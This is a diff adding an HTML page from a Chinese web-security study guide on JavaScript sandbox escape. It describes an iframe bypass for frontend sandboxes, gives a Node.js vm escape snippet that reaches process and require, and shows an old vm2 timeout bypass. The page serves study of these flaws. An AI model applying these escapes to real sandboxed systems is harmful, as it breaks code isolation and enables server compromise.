@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>5.4.8. 沙箱逃逸 &mdash; Web安全学习笔记 1.0 documentation</title>
+      <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/doctools.js"></script>
+        <script src="../../_static/sphinx_highlight.js"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="5.4.9. 反序列化" href="deserialization.html" />
+    <link rel="prev" title="5.4.7. 原型链" href="prototype.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Web安全学习笔记
+          </a>
+              <div class="version">
+                1.0
+              </div>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">内容索引:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../basic/index.html">1. 序章</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../network/index.html">2. 计算机网络与协议</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../info/index.html">3. 信息收集</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../vuln/index.html">4. 常见漏洞攻防</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../index.html">5. 语言与框架</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../php/index.html">5.1. PHP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../python/index.html">5.2. Python</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../java/index.html">5.3. Java</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="index.html">5.4. JavaScript</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="ECMAScript.html">5.4.1. ECMAScript</a></li>
+<li class="toctree-l3"><a class="reference internal" href="engine.html">5.4.2. 引擎</a></li>
+<li class="toctree-l3"><a class="reference internal" href="wasm.html">5.4.3. WebAssembly</a></li>
+<li class="toctree-l3"><a class="reference internal" href="scope.html">5.4.4. 作用域与闭包</a></li>
+<li class="toctree-l3"><a class="reference internal" href="strict.html">5.4.5. 严格模式</a></li>
+<li class="toctree-l3"><a class="reference internal" href="async.html">5.4.6. 异步机制</a></li>
+<li class="toctree-l3"><a class="reference internal" href="prototype.html">5.4.7. 原型链</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">5.4.8. 沙箱逃逸</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id2">5.4.8.1. 前端沙箱</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id3">5.4.8.2. 服务端沙箱</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="deserialization.html">5.4.9. 反序列化</a></li>
+<li class="toctree-l3"><a class="reference internal" href="jsfuck.html">5.4.10. jsfuck cheat sheet</a></li>
+<li class="toctree-l3"><a class="reference internal" href="trick.html">5.4.11. Trick</a></li>
+<li class="toctree-l3"><a class="reference internal" href="misc.html">5.4.12. 其他</a></li>
+<li class="toctree-l3"><a class="reference internal" href="ref.html">5.4.13. 参考链接</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../golang.html">5.5. Golang</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../ruby.html">5.6. Ruby</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../asp.html">5.7. ASP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../powershell.html">5.8. PowerShell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../shell.html">5.9. Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../csharp/index.html">5.10. CSharp</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../intranet/index.html">6. 内网渗透</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../cloud/index.html">7. 云安全</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../defense/index.html">8. 防御技术</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../auth/index.html">9. 认证机制</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tools/index.html">10. 工具与资源</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../manual/index.html">11. 手册速查</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../misc/index.html">12. 其他</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Web安全学习笔记</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../index.html"><span class="section-number">5. </span>语言与框架</a></li>
+          <li class="breadcrumb-item"><a href="index.html"><span class="section-number">5.4. </span>JavaScript</a></li>
+      <li class="breadcrumb-item active"><span class="section-number">5.4.8. </span>沙箱逃逸</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/language/javascript/vm.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="id1">
+<h1><span class="section-number">5.4.8. </span>沙箱逃逸<a class="headerlink" href="#id1" title="Permalink to this heading">¶</a></h1>
+<section id="id2">
+<h2><span class="section-number">5.4.8.1. </span>前端沙箱<a class="headerlink" href="#id2" title="Permalink to this heading">¶</a></h2>
+<p>在前端中，可能会使用删除 <code class="docutils literal notranslate"><span class="pre">eval</span></code> ，重写 <code class="docutils literal notranslate"><span class="pre">Function.prototype.constructor</span></code> / <code class="docutils literal notranslate"><span class="pre">GeneratorFunction</span></code> / <code class="docutils literal notranslate"><span class="pre">AsyncFunction</span></code> 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。</p>
+</section>
+<section id="id3">
+<h2><span class="section-number">5.4.8.2. </span>服务端沙箱<a class="headerlink" href="#id3" title="Permalink to this heading">¶</a></h2>
+<p>JavaScript提供了原生的vm模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的JavaScript API和全局的NodeJS环境。</p>
+<p>在原生的沙箱模块中，常用的逃逸方式为：</p>
+<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span><span class="w"> </span><span class="nx">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">sandbox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">whatIsThis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`</span>
+<span class="sb">    const ForeignObject = this.constructor;</span>
+<span class="sb">    const ForeignFunction = ForeignObject.constructor;</span>
+<span class="sb">    const process = ForeignFunction(&quot;return process&quot;)();</span>
+<span class="sb">    const require = process.mainModule.require;</span>
+<span class="sb">    require(&quot;fs&quot;);</span>
+<span class="sb">`</span><span class="p">,</span><span class="w"> </span><span class="nx">sandbox</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>考虑到JavaScript原生vm模块的缺陷，有开发者设计了vm2来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：</p>
+<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span>
+<span class="w">  </span><span class="s1">&#39;Promise.resolve().then(()=&gt;{while(1)console.log(&quot;foo&quot;, Date.now());}); while(1)console.log(Date.now())&#39;</span><span class="p">,</span>
+<span class="w">  </span><span class="p">{</span><span class="nx">console</span><span class="o">:</span><span class="p">{</span><span class="nx">log</span><span class="p">(){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">console</span><span class="p">,</span><span class="nx">arguments</span><span class="p">);}}},</span>
+<span class="w">  </span><span class="p">{</span><span class="nx">timeout</span><span class="o">:</span><span class="mf">5</span><span class="p">}</span>
+<span class="p">);</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="prototype.html" class="btn btn-neutral float-left" title="5.4.7. 原型链" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="deserialization.html" class="btn btn-neutral float-right" title="5.4.9. 反序列化" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2019-2023, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
